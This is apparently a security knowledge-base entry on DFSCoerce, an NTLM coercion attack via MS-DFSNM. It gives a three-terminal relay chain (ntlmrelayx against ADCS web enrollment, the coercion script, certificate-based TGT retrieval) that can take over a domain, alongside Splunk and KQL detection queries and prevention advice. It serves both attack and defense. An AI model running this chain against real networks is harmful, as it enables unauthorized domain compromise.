name: DFSCoerce - NTLM Coercion via MS-DFSNM
description: DFSCoerce abuses the MS-DFSNM (Distributed File System Namespace Management) protocol to coerce NTLM authentication from a target server. Like PetitPotam but uses a different RPC interface (netdfs). Combined with ntlmrelayx targeting ADCS HTTP enrollment (ESC8) or LDAP, it enables domain compromise from a low-privileged user.
notes:
=== THE IDEA ===
MS-DFSNM provides RPC calls (NetrDfsRemoveStdRoot, NetrDfsAddStdRoot)
that trigger the target to authenticate back to an attacker-controlled
listener. This NTLM auth can be relayed to ADCS, LDAP, or SMB.

=== INSTALL ===
  git clone https://github.com/Shutdown06/DFSCoerce
  pip3 install impacket

=== RELAY CHAIN (with ADCS ESC8) ===
  # Terminal 1 - start relay to ADCS web enrollment
  ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  # Terminal 2 - trigger coercion
  python3 dfscoerce.py -u <user> -p <pass> -d <domain> -dc-ip <dc_ip> <listener_ip>
  # Terminal 3 - use the certificate
  python3 gettgtpkinit.py <domain>/<dc_name>$ <dc_name>.ccache -cert-pfx <dc_name>.pfx

=== ALTERNATIVE COERCERS ===
Coercer.py combines multiple protocols (MS-EFSR, MS-RPRN, MS-DFSNM,
MS-FSRVP) into one tool. Use it to test all methods at once.

recommended.note: Another NTLM coercion method via MS-FSRVP. Chain both for coverage.
Relay coerced auth to ADCS HTTP enrollment for domain takeover.

defense.why_it_works: MS-DFSNM RPC calls trigger NTLM authentication callbacks from the target server to an attacker-specified UNC path. The relayed credential can authenticate to other services.
defense.prerequisites: Valid domain credentials; network access to target RPC (TCP 445) and relay target.
defense.impact: Domain compromise when relayed to ADCS (ESC8) or LDAP for RBCD/Shadow Credentials.
defense.detection: [MITRE T1187] RPC calls to the DFS Namespace service from unusual sources; NTLM relay indicators.
defense.artifacts: Windows Security Event 4624 (Type 3) from unexpected sources; ADCS enrollment logs; Sysmon network connections.
defense.splunk_spl:
index=windows EventCode=4624 LogonType=3 TargetUserName="*$"
| where like(IpAddress, "10.%") OR like(IpAddress, "192.168.%")
| stats count by TargetUserName, IpAddress
| where count > 5
defense.sentinel_kql:
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetUserName endswith "$"
| summarize count() by TargetUserName, IpAddress
| where count_ > 5
defense.prevention: Enforce EPA (Extended Protection for Authentication) on ADCS web enrollment; disable NTLM where possible; require SMB signing; restrict RPC access to DFS services.

detections.name: DFSCoerce - Anomalous machine account NTLM authentication
detections.logic:
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetUserName endswith "$"
| where AuthenticationPackageName == "NTLM"
| summarize AuthCount=count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)
| where AuthCount > 3
detections.false_positives: Legitimate DFS operations; domain controller replication
detections.tuning: Baseline normal machine account authentication patterns; alert on new source IPs
